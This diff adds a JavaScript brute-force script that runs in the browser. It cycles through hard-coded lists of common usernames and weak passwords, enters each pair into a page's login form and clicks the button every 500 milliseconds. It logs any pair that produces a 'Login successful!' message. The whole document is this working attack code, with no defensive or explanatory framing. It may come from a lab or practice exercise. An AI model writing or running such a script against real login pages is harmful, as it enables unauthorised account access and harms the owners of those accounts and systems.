@@ -1,0 +1,53 @@
+(async function bruteForce() {
+    // List of common usernames and passwords
+    const usernames = ['admin', 'user', 'guest', 'root', 'test', 'manager', 'admin1'];
+    const passwords = [
+        'password', '123456', 'admin123', 'welcome', 'letmein', '1234', 'password123', 'qwerty',
+        'abc123', 'secure', 'adminadmin', 'testtest', 'guestguest', 'iloveyou', 'password1'
+    ];
+
+    let attempts = 0; // Counter to track the number of attempts
+
+    // Function to shuffle an array
+    function shuffleArray(array) {
+        for (let i = array.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [array[i], array[j]] = [array[j], array[i]];
+        }
+    }
+
+    while (true) {
+        // Shuffle usernames and passwords before each iteration
+        shuffleArray(usernames);
+        shuffleArray(passwords);
+
+        // Try all combinations of usernames and passwords
+        for (let username of usernames) {
+            for (let password of passwords) {
+                // Fill in the username and password in the form
+                document.getElementById('login-username').value = username;
+                document.getElementById('login-password').value = password;
+
+                // Simulate clicking the login button
+                document.getElementById('login-btn').click();
+
+                // Increment the attempt counter
+                attempts++;
+
+                // Wait for the system to respond
+                await new Promise(r => setTimeout(r, 500)); // Simulate a 500ms delay
+
+                // Check the response message
+                let message = document.getElementById('auth-message').innerText;
+
+                if (message === 'Login successful!') {
+                    console.log(`Login successful with: Username = ${username}, Password = ${password}`);
+                    console.log(`Total attempts: ${attempts}`);
+                    return; // Stop brute force
+                }
+            }
+        }
+
+        console.log(`Round completed, total attempts so far: ${attempts}`);
+    }
+})();
